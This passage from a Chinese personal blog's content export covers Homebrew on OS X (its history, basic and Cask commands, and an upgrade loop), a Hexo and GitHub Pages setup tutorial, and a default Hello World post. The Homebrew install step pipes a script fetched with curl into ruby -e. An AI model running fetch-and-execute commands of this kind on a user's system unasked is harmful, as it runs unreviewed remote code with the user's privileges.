__MacPorts__：源于BSD的ports，纯源码编译安装。用简单的话来说，它帮你计算目标软件所需要的依赖，然后把所有依赖和目标软件依次下载源码编译安装。它的优点很明显，软件不依赖操作系统本身，升级系统版本一般不会破坏软件体系；同时缺点也很明显，无论安装还是更新软件，编译源代码实在是太费时间了，笔者的第一台Macbook是09年的经典小白mc207，酷睿P7550的CPU，每次升级MacPorts都只敢在晚上睡觉时进行。MacPorts是笔者最早使用的，陪伴了将近三年时间。最后放弃的原因不是编译费时，而是系统升级到了Yosemite和El Capitan后，有很多软件死活编译不通过，无法更新。 Fink: 很抱歉笔者没有用过，所以在这里我只放科普贴的简介Fink是基于Debian的packaging tools开发的。最大的特点是安装软件是预编译好的(pre-compiled/pre-built)。 所以，用Fink安装package是不需要在本机编译的，都是现成的binary code。 Fink最大的问题是package跟进不够快。很多最新版的软件，你要等Fink。 HomeBrew: 哈哈哈，有些读者都要怪我啰嗦了，这么半天才开始文章的主要角色。HomeBrew是基于Ruby语言写的，从包管理的特色上来看，它似乎是Macports和Fink俩生的儿子 😂。在依赖处理上，它尽量使用系统原有的库，如果系统不提供，它才安装依赖；安装时优先选择已编译好的二进制包，如果没有它才下载源码进行编译安装。 4. 安装HomeBrew 笔者之前介绍过，HomeBrew是用Ruby写的，而OSX内置了Ruby，所以打开终端(Terminal)，把/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;复制粘贴进去，回车执行，That’s all。 5. HomeBrew基础命令 笔者在这边以安装wget举例（OSX居然没有集成wget，真有点不爽） brew search wget 搜索软件，列出所有包含目标名称的软件 brew install wget 安装软件，默认安装到/usr/local下面去 brew info wget 查看安装包信息 brew uninstall wget 卸载软件 brew update 更新所有软件列表（HomeBrew使用git，直接从github上pull下来） brew upgrade 升级所有软件 brew cleanup 清理 brew list 列出所有通过HomeBrew安装的软件 brew doctor 检查HomeBrew是否存在问题 6. 笔者用HomeBrew安装的软件推荐列表 wget 不再赘述 htop top的高级版，更直观，是一款用来监测系统的CPU、内存、uptime、进程等系统信息的工具 tree 以树状形式列出文件目录树 tmux 终端复用软件，神器，谁用谁知道 hardlink-osx 让你给目录加硬链接，对，你没听错，目录！ macvim vim在OSX下的GUI版本，做了很多OSX的本地化，比如cmd+w关闭等等 mpg123 mpg321 名字很秀逗的两个软件，命令行音乐播放器，可以用来装个逼😀 mplayer mpv 两个非常棒的多媒体播放器，个人更偏好后者 mtr traceroute的加强版 nvm 对node进行多版本管理 python3 OSX下安装Python3最为方便的方法了 7. Cask – HomeBrew的大杀器 一句话介绍：用来安装各种OSX应用程序的工具，例如Chrome, Firefox，MysqlWorkbench。 安装Cask：brew tap phinze/homebrew-cask &amp;&amp; brew install brew-cask 使用（以Chrome举例）： brew cask search chrome 搜索应用，结果显示我们要安装google-chrome brew cask install google-chrome 安装应用 brew cask uninstall google-chrome 卸载应用 brew update 更新所有应用列表 brew cleanup 清理 Cask相比brew缺少了upgrade命令，所以这边奉上一行shell脚本，用来升级所有用Cask安装的应用程序 for c in $(brew cask list); do ! brew cask info $c | grep -qF &quot;Not installed&quot; || brew cask install $c; done 8. 结语HomeBrew以给我节省了很多找软件和安装软件的时间，导致我对它越来越喜欢，以至于，我系统里一切能用HomeBrew搜索到的软件，我全用它来搞定了。关于这篇博文，我觉得对某些人来说，那句给Cask进行upgrade的shell脚本，是最具有价值的。（那就~考虑给我点捐助进行鼓励吧，一元两元不嫌少，一百两百不嫌多）","categories":[],"tags":[{"name":"Software","slug":"Software","permalink":"https://blog.chaosjohn.com/tags/Software/"},{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"}]},{"title":"上手Hexo","slug":"Getting-Started-With-Hexo","date":"2016-01-28T14:18:28.000Z","updated":"2020-12-05T02:23:29.952Z","comments":true,"path":"Getting-Started-With-Hexo.html","link":"","permalink":"https://blog.chaosjohn.com/Getting-Started-With-Hexo.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 这篇文章主要记载一下我如何上手Hexo(搭建本博客的技术)。 前期准备 NodeJS GitHub (已配置好SSH接入，详情参考GitHub官网) 域名 (可选项，下面会说明何时必须要求绑定域名) 开始安装Hexo$ npm install -g hexo 在GitHub上创建博客仓库此时得考虑两种选择： GitHub Pages (每个GitHub账号只能创建一个，即该仓库的默认分支master就是博客，而且仓库名是固定为username.github.io)。如果博客搭建成功，浏览器访问https://username.github.io就能打开博客。 gh-pages (可以创建无限多个，每个仓库都能创建一个静态博客，但是博客必须在gh-pages分支下)。在这种情况下，博主必需使用域名通过CNAME解析你的博客仓库，否则文章的CSS样式路径会出错，导致整个页面会是下面这种没有样式的样子 在本地部署 在本地clone你创建的GitHub仓库 默认为master分支，如果你使用的是gh-pages，需要切换到gh-pages分支。$ git branch gh-pages &amp;&amp; git checkout gh-pages 初始化hexo $ hexo init，并且调用npm安装相应的node_modules $ npm install 开启服务器进行本地预览（此时hexo默认生成了一篇Hello-World博客）$ hexo server，浏览器打开localhost:4000就能看到效果博客效果。建议操作博客时关闭服务器(ctrl-c)。 新增博客$ hexo new &quot;new blog name&quot;，hexo会生成以new-blog-name.md为名的博客 部署到GitHub 编辑博客仓库根目录下的_config.yml文件，在末尾追加变成为 123456# Deployment## Docs: http://hexo.io/docs/deployment.htmldeploy: type: git repository: git@github.com:username/blog.git branch: master 为避免下一步骤出现 ERROR Deployer not found : git的报错，需要安装git部署模块$ npm install hexo-deployer-git --save 生成静态文章$ hexo generate 部署到GitHub`$ hexo deploy` 测试博客 如果搭建的是GitHub Pages，则直接访问https://username.github.io即可 如果搭建的是gh-pages，则还需配置域名，比如笔者的域名为chaosjohn.com。 在域名的DNS解析内新增两条A记录，指向GitHub Pages提供的IP 192.30.252.153 192.30.252.154 接着在DNS解析内新增一条CNAME记录，记录名比如使用blog，记录值为username.github.io，添加完后可能会在记录值追加一个’.’，不用纠结，这个就是CNAME的格式。 在博客仓库的source文件夹内新建一个CNAME文件，文件内容就是blog.chaosjohn.com 重新生成静态文章并且部署到GitHub，可以使用快捷命令$ hexo d -g 命令集合 常用命令 hexo new “postName” #新建文章 hexo new page “pageName” #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server） hexo deploy #将.deploy目录部署到GitHub hexo help # 查看帮助 hexo version #查看Hexo的版本 复合命令 hexo deploy -g #生成加部署 hexo server -g #生成加预览 命令简写 hexo n == hexo new hexo g == hexo generate hexo s == hexo server hexo d == hexo deploy (各位大侠行行好给点捐助吧）","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.chaosjohn.com/tags/hexo/"}]},{"title":"Hello World","slug":"hello-world","date":"2016-01-28T13:18:28.000Z","updated":"2020-11-25T08:45:08.000Z","comments":true,"path":"hello-world.html","link":"","permalink":"https://blog.chaosjohn.com/hello-world.html","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.chaosjohn.com/tags/MySQL/"},{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"proxy","slug":"proxy","permalink":"https://blog.chaosjohn.com/tags/proxy/"},{"name":"v2ray","slug":"v2ray","permalink":"https://blog.chaosjohn.com/tags/v2ray/"},{"name":"PAC","slug":"PAC","permalink":"https://blog.chaosjohn.com/tags/PAC/"},{"name":"TCP/IP","slug":"TCP-IP","permalink":"https://blog.chaosjohn.com/tags/TCP-IP/"},{"name":"netcat","slug":"netcat","permalink":"https://blog.chaosjohn.com/tags/netcat/"},{"name":"shell","slug":"shell","permalink":"https://blog.chaosjohn.com/tags/shell/"},{"name":"zsh","slug":"zsh","permalink":"https://blog.chaosjohn.com/tags/zsh/"},{"name":"jvm","slug":"jvm","permalink":"https://blog.chaosjohn.com/tags/jvm/"},{"name":"java","slug":"java","permalink":"https://blog.chaosjohn.com/tags/java/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://blog.chaosjohn.com/tags/SpringBoot/"},{"name":"kotlin","slug":"kotlin","permalink":"https://blog.chaosjohn.com/tags/kotlin/"},{"name":"network","slug":"network","permalink":"https://blog.chaosjohn.com/tags/network/"},{"name":"tool","slug":"tool","permalink":"https://blog.chaosjohn.com/tags/tool/"},{"name":"port-forwarding","slug":"port-forwarding","permalink":"https://blog.chaosjohn.com/tags/port-forwarding/"},{"name":"debug","slug":"debug","permalink":"https://blog.chaosjohn.com/tags/debug/"},{"name":"php","slug":"php","permalink":"https://blog.chaosjohn.com/tags/php/"},{"name":"xdebug","slug":"xdebug","permalink":"https://blog.chaosjohn.com/tags/xdebug/"},{"name":"sed","slug":"sed","permalink":"https://blog.chaosjohn.com/tags/sed/"},{"name":"git","slug":"git","permalink":"https://blog.chaosjohn.com/tags/git/"},{"name":"fix","slug":"fix","permalink":"https://blog.chaosjohn.com/tags/fix/"},{"name":"composer","slug":"composer","permalink":"https://blog.chaosjohn.com/tags/composer/"},{"name":"dev","slug":"dev","permalink":"https://blog.chaosjohn.com/tags/dev/"},{"name":"package manager","slug":"package-manager","permalink":"https://blog.chaosjohn.com/tags/package-manager/"},{"name":"APFS","slug":"APFS","permalink":"https://blog.chaosjohn.com/tags/APFS/"},{"name":"Virtualization","slug":"Virtualization","permalink":"https://blog.chaosjohn.com/tags/Virtualization/"},{"name":"IPv6","slug":"IPv6","permalink":"https://blog.chaosjohn.com/tags/IPv6/"},{"name":"VMware","slug":"VMware","permalink":"https://blog.chaosjohn.com/tags/VMware/"},{"name":"iCloud","slug":"iCloud","permalink":"https://blog.chaosjohn.com/tags/iCloud/"},{"name":"Software","slug":"Software","permalink":"https://blog.chaosjohn.com/tags/Software/"},{"name":"Homebrew","slug":"Homebrew","permalink":"https://blog.chaosjohn.com/tags/Homebrew/"},{"name":"Skills","slug":"Skills","permalink":"https://blog.chaosjohn.com/tags/Skills/"},{"name":"hexo","slug":"hexo","permalink":"https://blog.chaosjohn.com/tags/hexo/"},{"name":"Nginx","slug":"Nginx","permalink":"https://blog.chaosjohn.com/tags/Nginx/"},{"name":"Crack","slug":"Crack","permalink":"https://blog.chaosjohn.com/tags/Crack/"},{"name":"Java","slug":"Java","permalink":"https://blog.chaosjohn.com/tags/Java/"},{"name":"Gradle","slug":"Gradle","permalink":"https://blog.chaosjohn.com/tags/Gradle/"},{"name":"Error","slug":"Error","permalink":"https://blog.chaosjohn.com/tags/Error/"},{"name":"Dev","slug":"Dev","permalink":"https://blog.chaosjohn.com/tags/Dev/"},{"name":"Utility","slug":"Utility","permalink":"https://blog.chaosjohn.com/tags/Utility/"},{"name":"Android","slug":"Android","permalink":"https://blog.chaosjohn.com/tags/Android/"},{"name":"Developer","slug":"Developer","permalink":"https://blog.chaosjohn.com/tags/Developer/"},{"name":"Toy","slug":"Toy","permalink":"https://blog.chaosjohn.com/tags/Toy/"},{"name":"Hardware","slug":"Hardware","permalink":"https://blog.chaosjohn.com/tags/Hardware/"},{"name":"ThinkPad","slug":"ThinkPad","permalink":"https://blog.chaosjohn.com/tags/ThinkPad/"},{"name":"TrackPoint","slug":"TrackPoint","permalink":"https://blog.chaosjohn.com/tags/TrackPoint/"},{"name":"ddns","slug":"ddns","permalink":"https://blog.chaosjohn.com/tags/ddns/"}]}